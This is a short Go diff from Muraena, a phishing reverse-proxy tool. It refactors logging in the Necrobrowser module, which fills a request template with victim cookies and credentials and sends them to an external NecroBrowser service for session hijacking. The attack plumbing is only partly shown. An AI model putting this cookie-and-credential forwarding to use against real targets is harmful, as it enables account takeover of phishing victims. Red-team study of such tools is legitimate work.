@@ -6,10 +6,9 @@ import (
 	"strings"
 	"time"
 
-	"github.com/muraenateam/muraena/core/db"
-	"github.com/muraenateam/muraena/log"
-
 	"gopkg.in/resty.v1"
+
+	"github.com/muraenateam/muraena/core/db"
 
 	"github.com/muraenateam/muraena/session"
 )
@@ -113,10 +112,10 @@ func (module *Necrobrowser) Instrument(cookieJar []db.VictimCookie, credentialsJ
 
 	for _, c := range cookieJar {
 
-		log.Debug("trying to parse  %s  with layout  %s", c.Expires, timeLayout)
+		module.Debug("trying to parse  %s  with layout  %s", c.Expires, timeLayout)
 		t, err := time.Parse(timeLayout, c.Expires)
 		if err != nil {
-			log.Warning("warning: cant's parse Expires field (%s) of cookie %s. skipping cookie", c.Expires, c.Name)
+			module.Warning("warning: cant's parse Expires field (%s) of cookie %s. skipping cookie", c.Expires, c.Name)
 			continue
 		}
 
@@ -144,7 +143,7 @@ func (module *Necrobrowser) Instrument(cookieJar []db.VictimCookie, credentialsJ
 	module.Request = strings.ReplaceAll(module.Request, CookiePlaceholder, cookiesJSON)
 	module.Request = strings.ReplaceAll(module.Request, CredentialsPlaceholder, credentialsJSON)
 
-	log.Debug(" Sending to NecroBrowser cookies:\n%v", cookiesJSON)
+	module.Debug(" Sending to NecroBrowser cookies:\n%v", cookiesJSON)
 
 	client := resty.New()
 	resp, err := client.R().
